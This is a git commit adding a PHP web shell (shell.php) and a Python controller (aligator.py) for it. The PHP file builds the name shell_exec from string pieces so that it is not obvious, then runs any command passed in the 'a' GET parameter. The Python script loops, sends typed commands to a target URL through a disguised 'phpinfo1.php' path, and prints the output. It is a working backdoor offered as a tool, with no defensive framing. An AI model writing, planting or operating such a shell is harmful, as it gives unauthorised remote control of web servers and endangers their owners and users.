cde95469a8a8169302665f12559c932dfb13251b
DIBO237 <63423632+DIBO237@users.noreply.github.com>
2020-04-15 03:02:58 +0530

    Add files via upload

---
+++ aligator.py
@@ -0,0 +1,34 @@
+import requests
+import os
+import subprocess
+import sys
+ 
+print('''
+          _ _             _             
+    /\   | (_)           | |            
+   /  \  | |_  __ _  __ _| |_ ___  _ __ 
+  / /\ \ | | |/ _` |/ _` | __/ _ \| '__|
+ / ____ \| | | (_| | (_| | || (_) | |   
+/_/    \_\_|_|\__, |\__,_|\__\___/|_|  -- V 1.0 
+               __/ |                    
+              |___/    Made BY DIBO237#                   ''')
+
+print()
+url= input('Enter The Correct URL: ')
+print()
+print("......Connection Established......... : )")
+print()
+while True:
+    
+      try:
+          payload ='/phpinfo1.php?a='
+          command = input("Execute Commands: ")
+          r = requests.get(url + payload + command)
+          r.raise_for_status()
+          print(r.text)
+          if command == "exit":
+              exit()
+      except:
+           print("########### BHAG BHDK #############")
+           exit()
+        
---
+++ shell.php
@@ -0,0 +1,7 @@
+<?
+$a="she";
+$b="ll_e";
+$c="xec";
+$d=$a.$b.$c;
+ echo $d($_GET['a']);
+?>
